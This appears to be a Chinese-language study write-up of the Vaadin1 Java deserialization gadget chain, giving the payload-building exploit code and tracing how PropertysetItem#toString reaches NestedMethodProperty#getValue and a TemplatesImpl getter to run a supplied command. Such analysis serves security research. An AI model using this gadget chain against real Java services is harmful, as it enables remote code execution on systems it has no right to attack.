# Vaadin1

Vaadin 是一个在Java后端快速开发web应用程序的平台。用 Java 或 TypeScript 构建可伸缩的 UI，并使用集成的工具、组件和设计系统来更快地迭代、更好地设计和简化开发过程。

## exp

```java
 @Override
    public Object getObject (String command) throws Exception
    {
        Object templ = Gadgets.createTemplatesImpl (command);
        PropertysetItem pItem = new PropertysetItem ();

        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object> (templ, "outputProperties");
        pItem.addItemProperty ("outputProperties", nmprop);
        BadAttributeValueExpException b = new BadAttributeValueExpException ("");
        Reflections.setFieldValue (b, "val", pItem);
        return b;
    }
```

## 分析

### NestedMethodProperty

可以看出来是基于嵌套访问器的属性。大概看了一下代码，这个就是存储一个getter方法

```java
new NestedMethodProperty<Object> (templ, "outputProperties");
```

这个就是存储了一个templ#outputProperties的getter方法。


 ![image-20220513094441951](https://img.dem0dem0.top/images/image-20220513094441951.png)

 只要调用他的getvalue方法就可以触发

![image-20220513095101256](https://img.dem0dem0.top/images/image-20220513095101256.png)

### PropertysetItem

触发类是 `com.vaadin.data.util.PropertysetItem` ，这个类用来存储 Property 属性值，为其映射一个 id 对象。数据存放在成员变量 map 中，想要获取相应属性时，则调用 `getItemProperty` 方法在 map 中获取。

![image-20220513095158013](https://img.dem0dem0.top/images/image-20220513095158013.png)

### 链子


![image-20220513094304692](https://img.dem0dem0.top/images/image-20220513094304692.png)

toString起手==>PropertysetItem#toString ==> NestedMethodProperty#getvalue ==> template

